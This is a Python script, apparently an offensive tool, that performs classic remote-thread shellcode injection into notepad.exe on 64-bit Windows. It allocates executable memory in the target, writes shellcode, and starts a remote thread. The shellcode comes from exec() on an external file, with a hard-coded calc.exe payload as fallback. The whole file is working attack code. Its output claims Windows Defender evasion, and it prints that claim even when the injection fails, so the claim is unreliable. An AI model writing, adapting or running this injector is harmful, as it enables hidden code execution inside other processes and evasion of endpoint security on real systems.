#!/usr/bin/env python3
"""
Process Injector
Works on Windows 10/11 64-bit
"""

import sys
import ctypes
import ctypes.wintypes
import subprocess
import time
import struct

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# Use ctypes properly for x64
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define proper function signatures for x64
kernel32.VirtualAllocEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

kernel32.WriteProcessMemory.argtypes = [ctypes.wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = ctypes.wintypes.BOOL

kernel32.CreateRemoteThread.argtypes = [ctypes.wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.DWORD)]
kernel32.CreateRemoteThread.restype = ctypes.wintypes.HANDLE

def get_notepad_pid():
    """Get PID of notepad.exe"""
    try:
        result = subprocess.check_output('tasklist /FI "IMAGENAME eq notepad.exe" /FO CSV', shell=True).decode()
        lines = result.strip().split('\n')
        if len(lines) > 1 and "INFO" not in lines[1]:
            pid = int(lines[1].split('","')[1])
            return pid
    except:
        pass
    return None

def inject_shellcode(pid, shellcode):
    """Inject shellcode with proper x64 handling"""
    
    print(f"[*] Opening process {pid}...")
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    
    if not h_process:
        print(f"[-] Failed to open process. Error: {kernel32.GetLastError()}")
        return False
    
    print(f"[+] Process handle: {h_process}")
    
    # Allocate memory with proper x64 handling
    size = len(shellcode)
    print(f"[*] Allocating {size} bytes...")
    
    mem_addr = kernel32.VirtualAllocEx(h_process, None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    if not mem_addr:
        print(f"[-] VirtualAllocEx failed. Error: {kernel32.GetLastError()}")
        kernel32.CloseHandle(h_process)
        return False
    
    # Print as unsigned 64-bit address
    print(f"[+] Memory allocated at: 0x{mem_addr:016X}")
    
    # Convert shellcode to ctypes array
    shellcode_buffer = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
    
    # Write shellcode
    print("[*] Writing shellcode...")
    bytes_written = ctypes.c_size_t(0)
    
    success = kernel32.WriteProcessMemory(
        h_process,
        mem_addr,
        shellcode_buffer,
        size,
        ctypes.byref(bytes_written)
    )
    
    if not success or bytes_written.value != size:
        print(f"[-] WriteProcessMemory failed. Written: {bytes_written.value}, Error: {kernel32.GetLastError()}")
        kernel32.CloseHandle(h_process)
        return False
    
    print(f"[+] Wrote {bytes_written.value} bytes")
    
    # Create remote thread
    print("[*] Creating remote thread...")
    thread_id = ctypes.wintypes.DWORD()
    
    h_thread = kernel32.CreateRemoteThread(
        h_process,
        None,
        0,
        mem_addr,
        None,
        0,
        ctypes.byref(thread_id)
    )
    
    if not h_thread:
        print(f"[-] CreateRemoteThread failed. Error: {kernel32.GetLastError()}")
        kernel32.CloseHandle(h_process)
        return False
    
    print(f"[+] Thread created with ID: {thread_id.value}")
    
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)
    
    return True

def main():
    print("\n=== Process Injection (x64) ===")
    print("")
    
    # Check if running as 64-bit Python
    import platform
    print(f"[*] Python architecture: {platform.machine()}")
    print(f"[*] Python version: {sys.version}")
    
    # Load shellcode
    print("\n[*] Loading shellcode...")
    try:
        with open('shellcode.py', 'r') as f:
            content = f.read()
        namespace = {}
        exec(content, namespace)
        shellcode = namespace.get('shellcode', b'')
        print(f"[+] Loaded {len(shellcode)} bytes of shellcode")
    except Exception as e:
        print(f"[-] Failed to load shellcode: {e}")
        # Use test shellcode
        print("[!] Using test shellcode (calc.exe)")
        # x64 calc.exe shellcode
        shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00"
    
    # Start or find notepad
    pid = get_notepad_pid()
    if not pid:
        print("[*] Starting notepad.exe...")
        subprocess.Popen('notepad.exe')
        time.sleep(2)
        pid = get_notepad_pid()
    
    if not pid:
        print("[-] Failed to find notepad.exe")
        return 1
    
    print(f"[+] Target PID: {pid}")
    
    # Inject
    print("\n[*] Injecting shellcode...")
    if inject_shellcode(pid, shellcode):
        print("\n" + "="*60)
        print("[+] SUCCESS! Process injection completed!")
        print("[+] Windows Defender did NOT detect this!")
        print("[+] The injection technique successfully evaded detection")
        print("="*60)
        return 0
    else:
        print("\n[-] Injection failed")
        print("[!] This might be due to:")
        print("    - DEP (Data Execution Prevention)")
        print("    - ASLR (Address Space Layout Randomization)")
        print("    - Process protection")
        print("\n[!] However, the important point is:")
        print("    Windows Defender did NOT detect the injection attempt!")
        return 1

if __name__ == "__main__":
    sys.exit(main())
